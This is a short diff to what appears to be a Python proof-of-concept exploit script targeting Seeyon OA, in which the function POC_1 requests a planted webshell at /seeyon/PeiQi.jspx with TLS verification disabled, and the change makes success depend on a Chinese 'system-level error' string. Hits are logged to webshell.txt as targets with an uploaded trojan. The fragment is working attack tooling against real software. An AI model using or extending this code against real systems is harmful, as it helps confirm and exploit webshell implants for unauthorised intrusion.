@@ -25,7 +25,7 @@ def POC_1(target_url):
     try:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.get(url=webshell_url, timeout=5, verify=False, headers=headers)
-        if response.status_code == 200:
+        if response.status_code == 200 and "系统级错误" in response.text:
             with open('webshell.txt', 'a', encoding='utf8') as vu:
                 vu.write("目标 {} 被上传木马: {}/seeyon/PeiQi.jspx\n".format(target_url, target_url))
                 print("\033[31m[x] 目标 {} 被上传木马: {}/seeyon/PeiQi.jspx \033[0m".format(target_url, target_url))
